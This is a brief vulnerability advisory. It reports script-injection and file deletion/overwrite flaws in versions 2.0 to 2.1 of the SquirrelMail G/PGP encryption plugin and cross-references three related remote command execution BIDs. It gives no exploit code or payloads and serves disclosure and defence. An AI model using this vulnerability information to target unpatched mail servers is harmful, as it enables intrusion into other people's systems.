The G/PGP encryption plugin for SquirrelMail is prone to an input-validation vulnerability and an access-validation vulnerability.

Attackers can exploit these issues to inject arbitrary script code into public key data or to delete and overwrite arbitrary files with the privileges of the application.

SquirrelMail G/PGP Encryption Plugin 2.0, 2.0.1, and 2.1 are vulnerable; other versions may also be affected.

NOTE: One or more of these issues may already have been documented in the following BIDs, but we don't have enough information at this time to distinguish among them:

- 24782, SquirrelMail G/PGP Encryption Plug-in Unspecified Remote Command Execution Vulnerability
- 24828, SquirrelMail G/PGP Encryption Plug-in Multiple Unspecified Remote Command Execution Vulnerabilities
- 24874, SquirrelMail G/PGP Encryption Plug-in Multiple Remote Command Execution
